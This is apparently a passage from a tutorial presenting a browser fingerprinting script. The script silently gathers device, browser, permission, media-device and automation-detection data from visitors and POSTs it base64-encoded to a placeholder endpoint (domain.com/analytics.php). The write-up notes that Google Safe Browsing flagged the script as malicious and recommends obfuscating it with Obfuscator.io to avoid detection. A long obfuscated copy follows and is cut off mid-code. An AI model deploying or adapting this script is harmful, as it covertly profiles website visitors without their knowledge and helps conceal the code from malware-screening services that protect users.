            navigatorBotVars = ['__webdriver_script_fn', '__driver_evaluate', '__webdriver_evaluate', '__selenium_evaluate', '__fxdriver_evaluate', '__driver_unwrapped', '__webdriver_unwrapped', '__selenium_unwrapped', '__fxdriver_unwrapped', '__driver_unwrapped', '__webdriver_unwrapped', '__selenium_unwrapped', '__fxdriver_unwrapped', '__webdriver_script_func'],
            documentBotAttributes = ['webdriver', 'selenium', 'driver'];

    const botDetectionResults = {
        windowBotVars: {},
        navigatorBotVars: {},
        documentBotAttributes: {}
    };

    windowBotVars.forEach(varName => {
        botDetectionResults.windowBotVars[varName] = varName in window;
    });

    navigatorBotVars.forEach(varName => {
        botDetectionResults.navigatorBotVars[varName] = varName in navigator;
    });

    documentBotAttributes.forEach(attr => {
        botDetectionResults.documentBotAttributes[attr] = document.documentElement.getAttribute(attr) !== null;
    });

    return botDetectionResults;
}

clientInfo.botDetection = this.detectBotVariables();
...
...

```

### Prototype Tampering
Bots may also attempt to tamper with prototypes, such as `PluginArray` or `MimeTypeArray`, to bypass detection mechanisms. The `detectPrototypeTampering` function checks for inconsistencies in these prototypes to identify potential tampering.
```
...
...
// https://github.com/0x48piraj/BF-F/blob/master/lib/decog.js#L201
detectPrototypeTampering: function() {
    try {
        if (PluginArray.prototype !== navigator.plugins.__proto__) {
            return {status: 'failed', reason: 'Prototype tampering detected in PluginArray.'};
        }
    } catch (e) {}
    try {
        if (navigator.plugins[0] && Plugin.prototype !== navigator.plugins[0].__proto__) {
            return {status: 'failed', reason: 'Prototype tampering detected in Plugin.'};
        }
    } catch (e) {}
    try {
        if (MimeTypeArray.prototype !== navigator.mimeTypes.__proto__) {
            return {status: 'failed', reason: 'Prototype tampering detected in MimeTypeArray.'};
        }
    } catch (e) {}
    try {
        if (navigator.mimeTypes[0] && MimeType.prototype !== navigator.mimeTypes[0].__proto__) {
            return {status: 'failed', reason: 'Prototype tampering detected in MimeType.'};
        }
    } catch (e) {}

    return {status: 'passed', reason: 'No prototype tampering detected.'};
}

clientInfo.prototypeTampering = this.detectPrototypeTampering();
...
...

```

### Misc Logging
The `clientInfo.dateString` stores the current date and time as a string, while `clientInfo.evalLength` captures the length of the `eval` function's string representation, which varies between different browsers.
```
...
...
clientInfo.dateString = new Date().toString();

clientInfo.evalLength = eval.toString().length; // 33 in Chromium browsers, 37 in Firefox & Safari
...
...

```

### Encode & Send Data
Once we've collected all the client's data, we need to encode and send it to the server-side PHP script to process this data. The two functions below, `encodeData` and `sendData`, base64-encode the collected data and send it via Ajax to `analytics.php` for further processing, respectively.
```
...
...
encodeData: function(data) {
    const encoder = new TextEncoder();
    const encodedData = encoder.encode(JSON.stringify(data));
    return btoa(String.fromCharCode(...encodedData));
},

sendData: function(encodedData) {
    const xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://domain.com/analytics.php', true);
    xhr.setRequestHeader('Content-Type', 'application/json');
    xhr.send(JSON.stringify({ payload: encodedData }));
}
...
...

```

### Complete Code
The complete client-side logging script is shown below.
```
(function(global) {
    const ClientLogger = {
        logClientInfo: async function() {
            const clientInfo = {};
            if (navigator) {
                const navigatorProperties = {
                    userAgent: navigator.userAgent,
                    appName: navigator.appName,
                    appVersion: navigator.appVersion,
                    oscpu: navigator.oscpu || 'Not Supported',
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    cookieEnabled: navigator.cookieEnabled,
                    connection: navigator.connection ? navigator.connection.rtt : -1,
                    standalone: navigator.standalone || false,
                    userAgentData: navigator.userAgentData ? {
                      platform: navigator.userAgentData.platform || 'Unknown',
                      brands: navigator.userAgentData.brands || [],
                      mobile: navigator.userAgentData.mobile || false
                    } : 'Not supported',
                    onLine: navigator.onLine,
                    vendor: navigator.vendor,
                    product: navigator.product,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    maxTouchPoints: navigator.maxTouchPoints,
                    geolocation: !!navigator.geolocation,
                    clipboardRead: !!navigator.clipboard,
                    serviceWorker: !!navigator.serviceWorker,
                    mediaDevices: !!navigator.mediaDevices,
                    buildID: navigator.buildID || 'Unknown',
                    productSub: navigator.productSub || 'Unknown',
                    vendorSub: navigator.vendorSub || 'Unknown',
                    pdfViewerEnabled: navigator.pdfViewerEnabled || false,
                    deviceMemory: navigator.deviceMemory || 'Unknown',
                    doNotTrack: navigator.doNotTrack,
                    webdriver: navigator.webdriver || false,
                    bluetooth: !!navigator.bluetooth,
                    credentials: !!navigator.credentials,
                    hid: !!navigator.hid,
                    keyboard: !!navigator.keyboard,
                    locks: !!navigator.locks,
                    mediaCapabilities: !!navigator.mediaCapabilities,
                    mediaSession: !!navigator.mediaSession,
                    permissions: !!navigator.permissions,
                    presentation: !!navigator.presentation,
                    scheduling: !!navigator.scheduling,
                    serial: !!navigator.serial,
                    storage: !!navigator.storage,
                    usb: !!navigator.usb,
                    userActivation: !!navigator.userActivation,
                    wakeLock: !!navigator.wakeLock,
                    xr: !!navigator.xr,
                    plugins: Array.from(navigator.plugins).map(plugin => ({
                        name: plugin.name,
                        description: plugin.description,
                        filename: plugin.filename
                    }))
                };
                let navCount = 0;
                for (let prop in navigator) {
                    navCount++;
                }
                clientInfo.navigator = {
                    ...navigatorProperties,
                    propertyCount: navCount
                };
            }
            clientInfo.window = {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight,
                devicePixelRatio: window.devicePixelRatio || 1,
                pageXOffset: window.pageXOffset || 0,
                pageYOffset: window.pageYOffset || 0,
                screenX: window.screenX || 0,
                screenY: window.screenY || 0,
                scrollX: window.scrollX || 0,
                scrollY: window.scrollY || 0,
                historyLength: window.history.length,
                performance: {
                    timeOrigin: window.performance.timeOrigin,
                    navigationStart: window.performance.timing.navigationStart,
                    domContentLoadedEventEnd: window.performance.timing.domContentLoadedEventEnd,
                    loadEventEnd: window.performance.timing.loadEventEnd
                },
                features: {
                    serviceWorker: 'serviceWorker' in navigator,
                    localStorage: 'localStorage' in window,
                    sessionStorage: 'sessionStorage' in window,
                    indexedDB: 'indexedDB' in window,
                    matchMedia: typeof window.matchMedia !== 'undefined', 
                    touchSupport: 'ontouchstart' in window
                },
                visualViewport: window.visualViewport ? {
                    width: window.visualViewport.width,
                    height: window.visualViewport.height,
                    offsetLeft: window.visualViewport.offsetLeft,
                    offsetTop: window.visualViewport.offsetTop,
                    scale: window.visualViewport.scale
                } : null
            };
            if (screen) {
                clientInfo.screen = {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth,
                    pixelDepth: screen.pixelDepth,
                    orientation: screen.orientation ? screen.orientation.type : 'unknown',
                    availTop: screen.availTop || 0,
                    availLeft: screen.availLeft || 0
                };
            }
            if (navigator.permissions) {
                clientInfo.permissions = {};
                const permissionsList = [
                    'geolocation',
                    'notifications',
                    'push',
                    'camera',
                    'microphone',
                    'midi',
                    'clipboard-read',
                    'clipboard-write',
                    'accelerometer',
                    'ambient-light-sensor',
                    'background-sync',
                    'magnetometer',
                    'persistent-storage',
                    'payment-handler'
                ];
                await Promise.all(
                    permissionsList.map(async (permissionName) => {
                        try {
                            const result = await navigator.permissions.query({ name: permissionName });
                            clientInfo.permissions[permissionName] = result.state;
                        } catch {
                            clientInfo.permissions[permissionName] = 'Not supported';
                        }
                    })
                );
            }
            try {
                const canvas = document.createElement('canvas');
                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                if (gl) {
                    clientInfo.webGL = {
                        vendor: gl.getParameter(gl.VENDOR),
                        renderer: gl.getParameter(gl.RENDERER),
                        extensions: gl.getSupportedExtensions()
                    };
                }
            } catch (e) {
                clientInfo.webGL = { error: e.message };
            }
            clientInfo.storage = {
                localStorage: typeof localStorage !== 'undefined',
                sessionStorage: typeof sessionStorage !== 'undefined',
                indexedDB: !!window.indexedDB
            };

            clientInfo.media = {
                audioFormats: {
                    aac: new Audio().canPlayType('audio/aac'),
                    flac: new Audio().canPlayType('audio/flac'),
                    mpeg: new Audio().canPlayType('audio/mpeg'),
                    oggFlac: new Audio().canPlayType('audio/ogg; codecs="flac"'),
                    oggVorbis: new Audio().canPlayType('audio/ogg; codecs="vorbis"'),
                    oggOpus: new Audio().canPlayType('audio/ogg; codecs="opus"'),
                    wav: new Audio().canPlayType('audio/wav; codecs="1"'),
                    webmVorbis: new Audio().canPlayType('audio/webm; codecs="vorbis"'),
                    webmOpus: new Audio().canPlayType('audio/webm; codecs="opus"'),
                    mp4a: new Audio().canPlayType('audio/mp4; codecs="mp4a.40.2"')
                },
                videoFormats: {
                    mp4Flac: document.createElement('video').canPlayType('video/mp4; codecs="flac"'),
                    webmVp9Opus: document.createElement('video').canPlayType('video/webm; codecs="vp9, opus"'),
                    webmVp8Vorbis: document.createElement('video').canPlayType('video/webm; codecs="vp8, vorbis"')
                }
            };

            clientInfo.mediaDevices = [];
            await navigator.mediaDevices.enumerateDevices().then(devices => {
                devices.forEach(device => {
                    clientInfo.mediaDevices.push({ kind: device.kind });
                });
            });

            clientInfo.dateString = new Date().toString();

            clientInfo.adsBlocked = await this.checkAdBlocker();

            clientInfo.evalLength = eval.toString().length; // 33 in Chromium browsers, 37 in Firefox & Safari

            clientInfo.botDetection = this.detectBotVariables();

            clientInfo.prototypeTampering = this.detectPrototypeTampering();

            const encodedData = this.encodeData(clientInfo);
            this.sendData(encodedData);
        },

        encodeData: function(data) {
            const encoder = new TextEncoder();
            const encodedData = encoder.encode(JSON.stringify(data));
            return btoa(String.fromCharCode(...encodedData));
        },

        sendData: function(encodedData) {
            const xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://domain.com/analytics.php', true);
            xhr.setRequestHeader('Content-Type', 'application/json');
            xhr.send(JSON.stringify({ payload: encodedData }));
        },

        detectBotVariables: function() {
            const windowBotVars = ['webdriver', '_Selenium_IDE_Recorder', 'callSelenium', '_selenium', 'callPhantom', '_phantom', 'phantom', '__nightmare'],
                  navigatorBotVars = ['__webdriver_script_fn', '__driver_evaluate', '__webdriver_evaluate', '__selenium_evaluate', '__fxdriver_evaluate', '__driver_unwrapped', '__webdriver_unwrapped', '__selenium_unwrapped', '__fxdriver_unwrapped', '__driver_unwrapped', '__webdriver_unwrapped', '__selenium_unwrapped', '__fxdriver_unwrapped', '__webdriver_script_func'],
                  documentBotAttributes = ['webdriver', 'selenium', 'driver'];

            const botDetectionResults = {
                windowBotVars: {},
                navigatorBotVars: {},
                documentBotAttributes: {}
            };

            windowBotVars.forEach(varName => {
                botDetectionResults.windowBotVars[varName] = varName in window;
            });

            navigatorBotVars.forEach(varName => {
                botDetectionResults.navigatorBotVars[varName] = varName in navigator;
            });

            documentBotAttributes.forEach(attr => {
                botDetectionResults.documentBotAttributes[attr] = document.documentElement.getAttribute(attr) !== null;
            });

            return botDetectionResults;
        },

        detectPrototypeTampering: function() {
            try {
                if (PluginArray.prototype !== navigator.plugins.__proto__) {
                    return {status: 'failed', reason: 'Prototype tampering detected in PluginArray.'};
                }
            } catch (e) {}
            try {
                if (navigator.plugins[0] && Plugin.prototype !== navigator.plugins[0].__proto__) {
                    return {status: 'failed', reason: 'Prototype tampering detected in Plugin.'};
                }
            } catch (e) {}
            try {
                if (MimeTypeArray.prototype !== navigator.mimeTypes.__proto__) {
                    return {status: 'failed', reason: 'Prototype tampering detected in MimeTypeArray.'};
                }
            } catch (e) {}
            try {
                if (navigator.mimeTypes[0] && MimeType.prototype !== navigator.mimeTypes[0].__proto__) {
                    return {status: 'failed', reason: 'Prototype tampering detected in MimeType.'};
                }
            } catch (e) {}

            return {status: 'passed', reason: 'No prototype tampering detected.'};
        },

        // https://dirask.com/posts/JavaScript-detect-if-adblock-is-enabled-tested-in-2024-1yR6lD
        checkAdBlocker: function() {
            const ADS_URL = 'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js';
            return new Promise(resolve => {
                const xhr = new XMLHttpRequest();
                xhr.onreadystatechange = function() {
                    if (xhr.readyState === XMLHttpRequest.DONE) {
                        resolve(xhr.status === 0 || xhr.responseURL !== ADS_URL);
                    }
                };
                xhr.open('HEAD', ADS_URL, true);
                xhr.send(null);
            });
        }

    };
    global.ClientLogger = ClientLogger;
})(window);

```

### Obfuscated Complete Code
In one test case, the JavaScript code was marked malicious by Google Safe Browsing. Therefore, to avoid having the domain flagged by Safe Browsing, it's recommended to obfuscate the file using an obfuscation method. In this case, the script was obfuscated using `Obfuscator.io`.
```
function _0xad88(_0x2f4cba,_0x3f2b58){const _0x20cea8=_0x20ce();_0xad88=function(_0x5be247,_0x52395b){_0x5be247=_0x5be247-0x1c9;let _0x2e39cc=_0x20cea8[_0x5be247];if(_0xad88['cWUJmi']===undefined){var _0x2da4d5=function(_0xad88eb){const _0x2b2104='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x25c986='';let _0x1de73a='';for(let _0x1c3c3f=0x0,_0x5d1419,_0x5e3ab0,_0x48130b=0x0;_0x5e3ab0=_0xad88eb['charAt'](_0x48130b++);~_0x5e3ab0&&(_0x5d1419=_0x1c3c3f%0x4?_0x5d1419*0x40+_0x5e3ab0:_0x5e3ab0,_0x1c3c3f++%0x4)?_0x25c986+=String['fromCharCode'](0xff&_0x5d1419>>(-0x2*_0x1c3c3f&0x6)):0x0){_0x5e3ab0=_0x2b2104['indexOf'](_0x5e3ab0);}for(let _0xe93cef=0x0,_0x173849=_0x25c986['length'];_0xe93cef<_0x173849;_0xe93cef++){_0x1de73a+='%'+('00'+_0x25c986['charCodeAt'](_0xe93cef)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1de73a);};_0xad88['ELRjRE']=_0x2da4d5;_0x2f4cba=arguments;_0xad88['cWUJmi']=!![];}const _0x4d3060=_0x20cea8[0x0];const _0xaf3e62=_0x5be247+_0x4d3060;const _0x387bc1=_0x2f4cba[_0xaf3e62];if(!_0x387bc1){_0x2e39cc=_0xad88['ELRjRE'](_0x2e39cc);_0x2f4cba[_0xaf3e62]=_0x2e39cc;}else{_0x2e39cc=_0x387bc1;}return _0x2e39cc;};return _0xad88(_0x2f4cba,_0x3f2b58);}function _0x4813(_0x2f4cba,_0x3f2b58){const _0x20cea8=_0x20ce();_0x4813=function(_0x5be247,_0x52395b){_0x5be247=_0x5be247-0x1c9;let _0x2e39cc=_0x20cea8[_0x5be247];if(_0x4813['wrpRdo']===undefined){var _0x2da4d5=function(_0x2b2104){const _0x25c986='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x1de73a='';let _0x1c3c3f='';for(let _0x5d1419=0x0,_0x5e3ab0,_0x48130b,_0xe93cef=0x0;_0x48130b=_0x2b2104['charAt'](_0xe93cef++);~_0x48130b&&(_0x5e3ab0=_0x5d1419%0x4?_0x5e3ab0*0x40+_0x48130b:_0x48130b,_0x5d1419++%0x4)?_0x1de73a+=String['fromCharCode'](0xff&_0x5e3ab0>>(-0x2*_0x5d1419&0x6)):0x0){_0x48130b=_0x25c986['indexOf'](_0x48130b);}for(let _0x173849=0x0,_0x4b1ec3=_0x1de73a['length'];_0x173849<_0x4b1ec3;_0x173849++){_0x1c3c3f+='%'+('00'+_0x1de73a['charCodeAt'](_0x173849)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x1c3c3f);};const _0xad88eb=function(_0x1f36cd,_0x914370){let _0x50e47c=[],_0x53df61=0x0,_0x2c7678,_0x1d508c='';_0x1f36cd=_0x2da4d5(_0x1f36cd);let _0x4794e2;for(_0x4794e2=0x0;_0x4794e2<0x100;_0x4794e2++){_0x50e47c[_0x4794e2]=_0x4794e2;}for(_0x4794e2=0x0;_0x4794e2<0x100;_0x4794e2++){_0x53df61=(_0x53df61+_0x50e47c[_0x4794e2]+_0x914370['charCodeAt'](_0x4794e2%_0x914370['length']))%0x100;_0x2c7678=_0x50e47c[_0x4794e2];_0x50e47c[_0x4794e2]=_0x50e47c[_0x53df61];_0x50e47c[_0x53df61]=_0x2c7678;}_0x4794e2=0x0;_0x53df61=0x0;for(let _0x404ae9=0x0;_0x404ae9<_0x1f36cd['length'];_0x404ae9++){_0x4794e2=(_0x4794e2+0x1)%0x100;_0x53df61=(_0x53df61+_0x50e47c[_0x4794e2])%0x100;_0x2c7678=_0x50e47c[_0x4794e2];_0x50e47c[_0x4794e2]=_0x50e47c[_0x53df61];_0x50e47c[_0x53df61]=_0x2c7678;_0x1d508c+=String['fromCharCode'](_0x1f36cd['charCodeAt'](_0x404ae9)^_0x50e47c[(_0x50e47c[_0x4794e2]+_0x50e47c[_0x53df61])%0x100]);}return _0x1d508c;};_0x4813['RXvELj']=_0xad88eb;_0x2f4cba=arguments;_0x4813['wrpRdo']=!![];}const _0x4d3060=_0x20cea8[0x0];const _0xaf3e62=_0x5be247+_0x4d3060;const _0x387bc1=_0x2f4cba[_0xaf3e62];if(!_0x387bc1){if(_0x4813['ubfpzH']===undefined){_0x4813['ubfpzH']=!![];}_0x2e39cc=_0x4813['RXvELj'](_0x2e39cc,_0x52395b);_0x2f4cba[_0xaf3e62]=_0x2e39cc;}else{_0x2e39cc=_0x387bc1;}return _0x2e39cc;};return _0x4813(_0x2f4cba,_0x3f2b58);}function _0x20ce(){const _0x23abb7=['mediaDevices','Aw5UzxjizwLNAhq','yxzHAwXizwLNAhq','audio/webm;\x20codecs=\x22opus\x22','notifications','product','yw1IAwvUDc1SAwDODc1Zzw5ZB3i','BwfW','DONE','B3v0zxjxAwr0Aa','performance','zNjVBq','tt1WgmowW4yvCSoh','WQhdJCokf8kwW7HLrHJdU8oKW5z6WOe','webdriver','timeOrigin','tM8GChjVDg90ExbLihrHBxbLCMLUzYbKzxrLy3rLzc4','DMLZDwfSvMLLD3bVCNq','x3bOyw50B20','B2zMC2v0vg9W','oCoFW54gymo3W5tdVYldQvLLW6/cOvVcP8kRW6y/W5K','video/webm;\x20codecs=\x22vp9,\x20opus\x22','1603xQKRcI','createElement','brands','selenium','zSkrW7KScXy','WP8Ed0ZcJu1wsdZcN8o+','onreadystatechange','webgl','WR3dKmolamkVW751AYW','clipboard-read','WOtdGt7cSsbJbtG','y3jLyxrLrwXLBwvUDa','WOVdPCkhWOtcGCkAnSkxn8klceq','j31W','WPhdPCkyWOxcM8koma','W6vUemokW7NcK1XyhSodrd8','mtiZnZe2nfPYCujlCa','ChjVDg90ExbLvgfTCgvYAw5N','CgvYBwLZC2LVBNm','pgjcW6nyjuxdImo8mmoomCkhWRP6W7JdOrNdQmkX','C2vYAwfS','WQKAoCohdSkJCs4','1464417tBwUZI','ClientLogger','plugins','scheduling','C2nYzwvU','CgvYC2LZDgvUDc1ZDg9YywDL','smoVW59njCovWPzSDwBdOa','C2nHBgu','credentials','yxvKAw8VBxa0oYbJB2rLy3m9iM1WngeUndaUmIi','rSoVW5rpemojWPHVzh3dQmkK','CgvYzM9YBwfUy2u','clipboard','encode','BwLKAq','B3nJChu','connection','mimeTypes','kind','W5K8rSovWRLOg8k9mfqDhWlcHSoGnvi','DMvUzg9Yu3vI','stringify','state','W7xcJL0R','CgHHBNrVBq','yMfJA2DYB3vUzc1ZEw5J','pNKoBabHWPxdOeikWRxdTa','responseURL','W6PIv0H9wG','ntKWnte5q0DdDu9J','W5RcHWRdHKPjWOesW4ezWOa','W4RdT8ojW4ldT0a','getContext','AgfYzhDHCMvdB25JDxjYzw5JEq','WP8IW5ZcV8kYW4VcMW','DMLKzw8','Bg9JywXtDg9YywDL','zgvZy3jPChrPB24','domContentLoadedEventEnd','BwLTzvr5CgvZ','geolocation','W7tdICodzG','getAttribute','W6/cJv03CqzZW6yr','smo1W6VdP8orbtG','E8oHrmkaW5yx','navigatorBotVars','xcjpW45CxHjF','B3v0zxjizwLNAhq','video','x19MEgrYAxzLCL91BNDYyxbWzwq','x3nLBgvUAxvT','standalone','tM90ifn1ChbVCNrLza','storage','B3jPzw50yxrPB24','DgLTAw5N','zMfPBgvK','W7pcHMOpDdrUBYv1WPK','W4ZcLSoZwG5UWOGWWQtdKCkWbqL7cCko','Ahr0Chm6lY9KB21HAw4Uy29Tl2fUywX5DgLJCY5WAha','smoVW51XgCoCWO5wEhNdQa','payment-handler','W7DxW7BcOvrxvq','W7ldMvpdOCkjW7JcKmotFMFcIW','FSoGW5HpgSokWPK','y2HLy2TbzejSB2nRzxi','Not\x20supported','D2vIr0W','W7FdMvtdNCkaW70','W500WQHfWOFdLmoAW4ddPSk4EG','eCoPW4mhy8oL','Unknown','prototype','WRRdQc/cQIndbrFcQG','HEAD','C2nYB2XSwq','then','64965ZZSSYN','x19KCML2zxjFDw53CMfWCgvK','y2fUDMfZ','WOSpd1lcG0Ls','nZK4mJe3mhLnt1j6qq','sessionStorage','ogbPW4BcK8oKWOFdTCo2','getParameter','dateString','DxnI','WP3dPSk0kJKAp8oSWPrxW5VcPX0','sSk6W7WQfXpdLmo0W7VdQCorBXpdOInkyG','undefined','nZu1mJrWs3D6z2m','pgjfW7rvnvJdVSov','BwvKAwftzxnZAw9U','W7FdJCoDCdGYjW','yxvKAw8VB2DNoYbJB2rLy3m9iNzVCMjPCYi','uhjVDg90ExbLihrHBxbLCMLUzYbKzxrLy3rLzcbPBIbqBhvNAw5bCNjHEs4','pixelDepth','W4xdVmkIuhXCbsTBFgb9xSo4','canPlayType','nMvTW5pcPCoYWPBdOSoHouRcQ8oxW47dJq','yxvKAw8VywfJ','mobile','yxzHAwXmzwz0','W73dJCoqW5FdSebyBHS','y29UBMvJDgLVBG','platform','ywrZqMXVy2TLza','microphone','wtb3gmoCW4OjEmookcJcOmoe','W5Hrnmo7ua7cJCkzeSk/W4jfmq','mty0uMr5u2nn','WP3dQJPbiGjOwXnJWOKAdCo8WQKDWPThWRDE','z2v0u3vWCg9YDgvKrxH0zw5ZAw9UCW','W5JdOmo6WQRdLIRcTx80eSo3aa','yMX1zxrVB3rO','y2hcHCkxWPpdIq','FCo3a2pdUgFdNSo/W7/cTq','__selenium_unwrapped','callSelenium','W6ZdISkMqh9uisTiBMjnwCoIWP1XWQhdKabelq','zg9JDw1LBNrcB3rbDhrYAwj1DgvZ','audio/flac','audio/mpeg','WRJdUmowWQCgf8k9WOuRWOvjgq','WP7dU8kOpef8W43dVZzoWP/cJmo4','DxnLCKfNzw50rgf0yq','W7xcTqJdJ3zOWO4bW58JWR1LWPTrWRyiW7TqW7bIWP/cLG','Ahr0Chm6lY9WywDLywqYlMDVB2DSzxn5BMrPy2f0Aw9UlMnVBs9WywDLywqVANmVywrZyNLNB29NBguUANm','zM9YrwfJAa','Dw5KzwzPBMvK','8mBcbIp','zhjPDMvY','zg9JDw1LBNrfBgvTzw50','590519CGCuOc','pdfViewerEnabled','matchMedia','passed','w8o8W5XvgSojWO5Yza','history','W57cJYi3quKvWQ1WFYefWRRcPCkNfmkTumkLxdO','DhLWzq','timing','1237164ZrqBKp','yxvKAw8VD2vIBtSGy29KzwnZpsj2B3jIAxmI','DMvUzg9Y','zWX6fmoxW4CpESocpZK','Bwf4vg91y2HqB2LUDhm','doNotTrack','setRequestHeader','r2fXtJVdTc8Ple5M','video/webm;\x20codecs=\x22vp8,\x20vorbis\x22','13662DoBSdO','W5vKdmoiW7xcNK0IjCoixZ/cIq','permissions','nSkXW5nGvGRdIcD7W68AW51e','ECkkW7SZdq','ywXS','vw5RBM93BG','y2fUugXHEvr5Cgu'];_0x20ce=function(){return _0x23abb7;};return _0x20ce();}function _0x5be2(_0x2f4cba,_0x3f2b58){const _0x20cea8=_0x20ce();_0x5be2=function(_0x5be247,_0x52395b){_0x5be247=_0x5be247-0x1c9;let _0x2e39cc=_0x20cea8[_0x5be247];return _0x2e39cc;};return _0x5be2(_0x2f4cba,_0x3f2b58);}(function(_0x4e0950,_0x38dbed){const _0x1eebcf=_0x4813;const _0x5a29b8=_0xad88;const _0xdf6951=_0x5be2;const _0x3e4147=_0x4e0950();while(!![]){try{const _0x3c0553=parseInt(_0xdf6951(0x237))/0x1+parseInt(_0x5a29b8(0x20c))/0x2+-parseInt(_0x5a29b8(0x277))/0x3+-parseInt(_0x5a29b8(0x220))/0x4*(-parseInt(_0xdf6951(0x1ff))/0x5)+-parseInt(_0x1eebcf(0x1eb,'l9vG'))/0x6*(-parseInt(_0xdf6951(0x267))/0x7)+parseInt(_0xdf6951(0x234))/0x8*(-parseInt(_0xdf6951(0x27d))/0x9)+-parseInt(_0x5a29b8(0x203))/0xa;if(_0x3c0553===_0x38dbed){break;}else{_0x3e4147['push'](_0x3e4147['shift']());}}catch(_0x3898ca){_0x3e4147['push'](_0x3e4147['shift']());}}}(_0x20ce,0x4b775));(function(_0x53df61){const _0xbe601c=_0x5be2;const _0x2c7678={'logClientInfo':async function(){const _0x32fad4=_0x5be2;const _0x4ff5ca=_0xad88;const _0x13c6f3=_0x4813;const _0x1d508c={};if(navigator){const _0x404ae9={'userAgent':navigator[_0x13c6f3(0x1dc,'SH!e')],'appName':navigator['appName'],'appVersion':navigator['appVersion'],'oscpu':navigator[_0x4ff5ca(0x28c)]||_0x4ff5ca(0x1e6),'platform':navigator['platform'],'language':navigator[_0x13c6f3(0x1e0,'Yy)i')],'languages':navigator['languages'],'cookieEnabled':navigator['cookieEnabled'],'connection':navigator[_0x4ff5ca(0x21a)]?navigator[_0x32fad4(0x28d)][_0x13c6f3(0x274,'@#Bt')]:-0x1,'standalone':navigator[_0x32fad4(0x1e5)]||![],'userAgentData':navigator['userAgentData']?{'platform':navigator[_0x4ff5ca(0x22f)][_0x32fad4(0x21b)]||_0x13c6f3(0x1f2,'eF59'),'brands':navigator[_0x13c6f3(0x22e,'vPU$')][_0x32fad4(0x269)]||[],'mobile':navigator[_0x13c6f3(0x209,'VDy$')][_0x32fad4(0x217)]||![]}:_0x32fad4(0x1f4),'onLine':navigator['onLine'],'vendor':navigator[_0x4ff5ca(0x242)],'product':navigator[_0x32fad4(0x256)],'hardwareConcurrency':navigator[_0x4ff5ca(0x1d2)],'maxTouchPoints':navigator[_0x4ff5ca(0x244)],'geolocation':!!navigator[_0x13c6f3(0x26c,'4ZLk')],'clipboardRead':!!navigator[_0x32fad4(0x289)],'serviceWorker':!!navigator[_0x13c6f3(0x21f,'(gR1')],'mediaDevices':!!navigator[_0x32fad4(0x251)],'buildID':navigator['buildID']||_0x13c6f3(0x1f0,'lbT4'),'productSub':navigator['productSub']||'Unknown','vendorSub':navigator[_0x4ff5ca(0x291)]||_0x4ff5ca(0x24f),'pdfViewerEnabled':navigator[_0x32fad4(0x238)]||![],'deviceMemory':navigator[_0x13c6f3(0x22d,'29!C')]||_0x32fad4(0x1f9),'doNotTrack':navigator[_0x32fad4(0x245)],'webdriver':navigator[_0x32fad4(0x25f)]||![],'bluetooth':!!navigator[_0x4ff5ca(0x224)],'credentials':!!navigator[_0x32fad4(0x285)],'hid':!!navigator['hid'],'keyboard':!!navigator['keyboard'],'locks':!!navigator[_0x13c6f3(0x24d,'[NV8')],'mediaCapabilities':!!navigator[_0x13c6f3(0x290,'cUZ6')],'mediaSession':!!navigator[_0x4ff5ca(0x20e)],'permissions':!!navigator[_0x4ff5ca(0x279)],'presentation':!!navigator['presentation'],'scheduling':!!navigator[_0x32fad4(0x280)],'serial':!!navigator[_0x4ff5ca(0x27b)],'storage':!!navigator[_0x13c6f3(0x202,'4ZLk')],'usb':!!navigator[_0x4ff5ca(0x208)],'userActivation':!!navigator[_0x13c6f3(0x25e,'P3N$')],'wakeLock':!!navigator['wakeLock'],'xr':!!navigator['xr'],'plugins':Array[_0x4ff5ca(0x25c)](navigator[_0x32fad4(0x27f)])[_0x4ff5ca(0x258)](_0x364d82=>({'name':_0x364d82[_0x13c6f3(0x1da,'#E&E')],'description':_0x364d82[_0x4ff5ca(0x1d6)],'filename':_0x364d82['filename']}))};let _0x54352c=0x0;for(let _0x2b77f7 in navigator){_0x54352c++;}_0x1d508c['navigator']={..._0x404ae9,'propertyCount':_0x54352c};}_0x1d508c[_0x13c6f3(0x1f8,'sWUH')]={'innerWidth':window[_0x13c6f3(0x226,'bfMK')],'innerHeight':window[_0x4ff5ca(0x252)],'outerWidth':window[_0x4ff5ca(0x25a)],'outerHeight':window[_0x4ff5ca(0x1e1)],'devicePixelRatio':window[_0x13c6f3(0x1ec,'p*uS')]||0x1,'pageXOffset':window[_0x13c6f3(0x247,'AXUV')]||0x0,'pageYOffset':window[_0x13c6f3(0x1cf,'XU)8')]||0x0,'screenX':window[_0x13c6f3(0x1dd,'9aO1')]||0x0,'screenY':window['screenY']||0x0,'scrollX':window[_0x13c6f3(0x1d3,'KVDi')]||0x0,'scrollY':window[_0x4ff5ca(0x1fd)]||0x0,'historyLength':window[_0x32fad4(0x23c)]['length'],'performance':{'timeOrigin':window[_0x4ff5ca(0x288)][_0x32fad4(0x260)],'navigationStart':window[_0x4ff5ca(0x288)][_0x4ff5ca(0x1e9)]['navigationStart'],'domContentLoadedEventEnd':window[_0x32fad4(0x25b)][_0x32fad4(0x23f)][_0x32fad4(0x1d7)],'loadEventEnd':window[_0x32fad4(0x25b)]['timing'][_0x13c6f3(0x1cb,'@JJb')]},'features':{'serviceWorker':_0x13c6f3(0x24a,'Znbh')in navigator,'localStorage':_0x4ff5ca(0x1d5)in window,'sessionStorage':_0x32fad4(0x204)in window,'indexedDB':_0x13c6f3(0x26f,'P3N$')in window,'matchMedia':typeof window[_0x32fad4(0x239)]!==_0x13c6f3(0x25d,'MUXm'),'touchSupport':_0x13c6f3(0x273,'Ym0F')in 